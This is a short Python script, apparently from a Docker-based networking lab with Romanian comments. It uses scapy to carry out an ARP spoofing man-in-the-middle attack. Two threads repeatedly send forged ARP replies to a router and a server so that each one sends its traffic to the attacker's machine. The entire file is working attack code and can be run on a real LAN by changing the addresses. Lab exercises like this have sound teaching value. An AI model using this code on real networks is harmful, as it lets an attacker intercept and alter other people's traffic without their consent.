from scapy.all import ARP, send
import time
import threading

# IP-urile containerelor
router_ip = "198.7.0.1"
server_ip = "198.7.0.2"

# MAC-urile din diagramă (fixe în Docker)
router_mac = "02:42:c6:0a:00:01"
server_mac = "02:42:c6:0a:00:03"

# Pachet fals pentru server: "router-ul sunt eu (middle)"
def spoof_server():
    pkt = ARP(op=2, pdst=server_ip, hwdst=server_mac, psrc=router_ip)
    while True:
        send(pkt, verbose=False)
        time.sleep(2)

# Pachet fals pentru router: "server-ul sunt eu (middle)"
def spoof_router():
    pkt = ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=server_ip)
    while True:
        send(pkt, verbose=False)
        time.sleep(2)

if __name__ == "__main__":
    print("[*] Începem spoofing ARP...")
    threading.Thread(target=spoof_server).start()
    threading.Thread(target=spoof_router).start()
